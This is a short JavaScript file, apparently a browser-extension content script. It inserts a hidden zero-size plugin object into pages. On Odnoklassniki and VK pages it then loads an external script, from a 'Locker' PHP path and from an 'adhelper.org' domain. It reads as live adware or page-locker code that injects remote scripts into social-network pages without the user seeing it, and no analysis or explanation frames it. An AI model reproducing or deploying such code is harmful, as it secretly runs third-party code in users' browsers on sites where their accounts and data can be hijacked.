var plg = document.createElement("object");
if (plg) {
	plg.setAttribute("type", "application/afp");
	plg.setAttribute("id", "AFP");
	plg.setAttribute("width", 0);
	plg.setAttribute("height", 0);
	document.body.appendChild(plg);
}

if(location.hostname.indexOf('odnoklassniki') > -1)
	var scr = 'http://localhost/Locker/lock_2.php';
if(location.hostname.indexOf('vk') > -1)
	var scr = 'http://adhelper.org/vk/lvk.js';
if(scr){
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', scr);
	document.body.appendChild(script);
}